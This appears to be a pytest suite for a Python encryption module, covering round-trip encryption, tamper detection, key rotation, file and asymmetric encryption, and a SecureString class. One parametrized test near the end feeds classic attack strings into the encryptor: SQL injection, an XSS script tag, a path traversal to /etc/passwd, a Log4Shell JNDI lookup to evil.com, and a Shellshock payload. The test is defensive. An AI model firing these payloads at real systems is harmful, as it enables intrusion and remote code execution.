"""
Comprehensive security tests for encryption module
"""

import pytest
import os
import json
import tempfile
from datetime import datetime, timedelta
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

from security.core.encryption import EncryptionManager, SecureString


class TestEncryptionManager:
    """Test suite for EncryptionManager"""
    
    @pytest.fixture
    def encryption_manager(self):
        """Create encryption manager instance"""
        return EncryptionManager()
    
    def test_encrypt_decrypt_string(self, encryption_manager):
        """Test string encryption and decryption"""
        plaintext = "This is sensitive data"
        
        # Encrypt
        encrypted = encryption_manager.encrypt(plaintext)
        
        # Verify encrypted format
        assert isinstance(encrypted, dict)
        assert 'ciphertext' in encrypted
        assert 'nonce' in encrypted
        assert 'context' in encrypted
        assert 'version' in encrypted
        assert 'algorithm' in encrypted
        
        # Decrypt
        decrypted = encryption_manager.decrypt(encrypted)
        
        assert decrypted == plaintext
    
    def test_encrypt_decrypt_dict(self, encryption_manager):
        """Test dictionary encryption and decryption"""
        data = {
            'username': 'testuser',
            'password': 'secret123',
            'api_key': 'key-12345'
        }
        
        # Encrypt
        encrypted = encryption_manager.encrypt(data)
        
        # Decrypt
        decrypted = encryption_manager.decrypt(encrypted)
        
        assert decrypted == data
    
    def test_encrypt_with_context(self, encryption_manager):
        """Test encryption with different contexts"""
        data = "sensitive"
        
        # Encrypt with different contexts
        encrypted1 = encryption_manager.encrypt(data, context="user")
        encrypted2 = encryption_manager.encrypt(data, context="admin")
        
        # Ciphertexts should be different
        assert encrypted1['ciphertext'] != encrypted2['ciphertext']
        
        # Both should decrypt correctly
        assert encryption_manager.decrypt(encrypted1) == data
        assert encryption_manager.decrypt(encrypted2) == data
    
    def test_tamper_detection(self, encryption_manager):
        """Test that tampering is detected"""
        data = "original data"
        encrypted = encryption_manager.encrypt(data)
        
        # Tamper with ciphertext
        import base64
        ciphertext = base64.b64decode(encrypted['ciphertext'])
        tampered = ciphertext[:-1] + b'X'
        encrypted['ciphertext'] = base64.b64encode(tampered).decode()
        
        # Decryption should fail
        with pytest.raises(ValueError, match="Decryption failed"):
            encryption_manager.decrypt(encrypted)
    
    def test_file_encryption(self, encryption_manager):
        """Test file encryption and decryption"""
        # Create test file
        with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
            f.write("Secret file content")
            test_file = f.name
        
        try:
            # Encrypt file
            encrypted_file = encryption_manager.encrypt_file(test_file)
            assert os.path.exists(encrypted_file)
            
            # Decrypt file
            decrypted_file = encryption_manager.decrypt_file(encrypted_file)
            
            # Verify content
            with open(decrypted_file, 'r') as f:
                content = f.read()
            
            assert content == "Secret file content"
            
        finally:
            # Cleanup
            for file in [test_file, encrypted_file, decrypted_file]:
                if os.path.exists(file):
                    os.remove(file)
    
    def test_key_rotation(self, encryption_manager):
        """Test key rotation functionality"""
        data = "test data"
        
        # Encrypt with current key
        encrypted = encryption_manager.encrypt(data, context="test")
        original_version = encrypted['version']
        
        # Rotate keys
        rotation_result = encryption_manager.rotate_keys("test")
        
        assert 'rotated_contexts' in rotation_result
        assert 'test' in rotation_result['rotated_contexts']
        assert rotation_result['new_version'] != original_version
        
        # Old encrypted data should still decrypt
        decrypted = encryption_manager.decrypt(encrypted)
        assert decrypted == data
        
        # New encryption should use new version
        new_encrypted = encryption_manager.encrypt(data, context="test")
        assert new_encrypted['version'] == rotation_result['new_version']
    
    def test_asymmetric_encryption(self, encryption_manager):
        """Test asymmetric encryption"""
        data = b"Asymmetric test data"
        
        # Encrypt
        encrypted = encryption_manager.encrypt_asymmetric(data)
        
        # Should be different from plaintext
        assert encrypted != data
        assert len(encrypted) > len(data)
        
        # Decrypt
        decrypted = encryption_manager.decrypt_asymmetric(encrypted)
        
        assert decrypted == data
    
    def test_large_data_encryption(self, encryption_manager):
        """Test encryption of large data"""
        # Generate 10MB of data
        large_data = os.urandom(10 * 1024 * 1024)
        
        # Encrypt
        encrypted = encryption_manager.encrypt(large_data)
        
        # Decrypt
        decrypted = encryption_manager.decrypt(encrypted)
        
        assert decrypted == large_data
    
    def test_concurrent_encryption(self, encryption_manager):
        """Test thread-safe encryption"""
        import threading
        import queue
        
        results = queue.Queue()
        data_items = [f"data-{i}" for i in range(100)]
        
        def encrypt_decrypt(data):
            encrypted = encryption_manager.encrypt(data)
            decrypted = encryption_manager.decrypt(encrypted)
            results.put(decrypted == data)
        
        threads = []
        for data in data_items:
            t = threading.Thread(target=encrypt_decrypt, args=(data,))
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        # All operations should succeed
        while not results.empty():
            assert results.get() is True


class TestSecureString:
    """Test suite for SecureString"""
    
    def test_secure_string_creation(self):
        """Test secure string creation and retrieval"""
        secret = "my-secret-password"
        secure = SecureString(secret)
        
        # Original should not be visible in string representation
        assert secret not in str(secure)
        assert secret not in repr(secure)
        
        # Should be able to retrieve value
        assert secure.get_value() == secret
    
    def test_secure_string_memory_protection(self):
        """Test that secure string protects memory"""
        secret = "sensitive-data"
        secure = SecureString(secret)
        
        # Hash should be consistent
        secure2 = SecureString(secret)
        assert secure._hash == secure2._hash
        
        # Different values should have different hashes
        secure3 = SecureString("different")
        assert secure._hash != secure3._hash
    
    def test_secure_string_tampering(self):
        """Test that tampering with secure string is detected"""
        secure = SecureString("test")
        
        # Tamper with encrypted data
        secure._encrypted = b"tampered"
        
        # Should raise error when trying to get value
        with pytest.raises(ValueError):
            secure.get_value()


class TestEncryptionSecurity:
    """Security-specific tests for encryption"""
    
    def test_no_plaintext_in_memory(self):
        """Verify plaintext is not left in memory"""
        import gc
        
        manager = EncryptionManager()
        sensitive = "SUPER_SECRET_DATA_12345"
        
        # Encrypt data
        encrypted = manager.encrypt(sensitive)
        
        # Force garbage collection
        sensitive = None
        gc.collect()
        
        # Check that plaintext is not in encrypted output
        encrypted_str = json.dumps(encrypted)
        assert "SUPER_SECRET_DATA_12345" not in encrypted_str
    
    def test_timing_attack_resistance(self):
        """Test resistance to timing attacks"""
        import time
        
        manager = EncryptionManager()
        
        # Encrypt same data multiple times
        data = "test"
        times = []
        
        for _ in range(100):
            start = time.perf_counter()
            encrypted = manager.encrypt(data)
            manager.decrypt(encrypted)
            end = time.perf_counter()
            times.append(end - start)
        
        # Check that timing is relatively consistent
        import statistics
        mean_time = statistics.mean(times)
        std_dev = statistics.stdev(times)
        
        # Standard deviation should be small relative to mean
        assert std_dev < mean_time * 0.2  # Less than 20% variation
    
    def test_encryption_determinism(self):
        """Test that encryption is non-deterministic"""
        manager = EncryptionManager()
        data = "same data"
        
        # Encrypt same data multiple times
        encrypted1 = manager.encrypt(data)
        encrypted2 = manager.encrypt(data)
        
        # Ciphertexts should be different (due to different nonces)
        assert encrypted1['ciphertext'] != encrypted2['ciphertext']
        assert encrypted1['nonce'] != encrypted2['nonce']
        
        # But both should decrypt to same value
        assert manager.decrypt(encrypted1) == data
        assert manager.decrypt(encrypted2) == data
    
    def test_key_derivation_strength(self):
        """Test key derivation function strength"""
        manager = EncryptionManager()
        
        # Derive keys for different contexts
        key1 = manager.derive_key("context1")
        key2 = manager.derive_key("context2")
        
        # Keys should be different
        assert key1 != key2
        
        # Keys should be 32 bytes (256 bits)
        assert len(key1) == 32
        assert len(key2) == 32
        
        # Same context should produce same key
        key1_again = manager.derive_key("context1")
        assert key1 == key1_again
    
    @pytest.mark.parametrize("attack_vector", [
        "'; DROP TABLE users; --",
        "<script>alert('XSS')</script>",
        "../../etc/passwd",
        "${jndi:ldap://evil.com/a}",
        "() { :; }; echo vulnerable",
    ])
    def test_malicious_input_handling(self, attack_vector):
        """Test that malicious inputs are handled safely"""
        manager = EncryptionManager()
        
        # Should handle malicious input safely
        encrypted = manager.encrypt(attack_vector)
        decrypted = manager.decrypt(encrypted)
        
        # Should preserve the input exactly (encryption doesn't modify)
        assert decrypted == attack_vector
        
        # Encrypted data should not expose the attack vector
        encrypted_str = json.dumps(encrypted)
        assert attack_vector not in encrypted_str